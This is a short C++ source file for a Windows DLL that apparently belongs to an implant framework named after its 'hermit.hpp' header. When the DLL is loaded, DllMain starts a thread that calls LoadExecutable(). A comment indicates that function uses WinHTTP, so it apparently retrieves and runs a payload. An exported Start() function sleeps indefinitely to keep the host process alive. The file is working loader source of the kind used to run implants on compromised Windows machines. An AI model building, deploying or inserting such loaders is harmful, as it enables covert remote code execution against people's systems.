#include "hermit.hpp"

#define MAX_THREADS 3

DWORD WINAPI ThreadProc(LPVOID lpParam);

DLLEXPORT VOID Start()
{
    while (TRUE)
    {
        Sleep(24*60*60*1000);
    }
}

DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    DisplayMessageBoxA("Start", "DllMain");

    HANDLE hThread = NULL;

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            DisplayMessageBoxA("DLL_PROCESS_ATTACH", "DllMain");

            // Execute the Run function within a new thread
            // because WinHTTP functions are not usable in DllMain.
            hThread = CreateThread(
                NULL,
                0,
                ThreadProc,
                hinstDLL,
                0,
                NULL
            );
            // WaitForSingleObject(hThread, INFINITE);
            // CloseHandle(hThread);
            break;
        case DLL_THREAD_ATTACH:
            DisplayMessageBoxA("DLL_THREAD_ATTACH", "DllMain");
        case DLL_THREAD_DETACH:
            DisplayMessageBoxA("DLL_THREAD_DETACH", "DllMain");
        case DLL_PROCESS_DETACH:
            DisplayMessageBoxA("DLL_PROCESS_DETACH", "DllMain");
            if (lpvReserved != NULL)
            {
                break;
            }
            break;
    }

    DisplayMessageBoxA("Exit", "DllMain");
    return TRUE;
}

DWORD WINAPI ThreadProc(LPVOID lpParam)
{
    DisplayMessageBoxA("Start", "ThreadProc");
    
    LoadExecutable();

    return 0;
}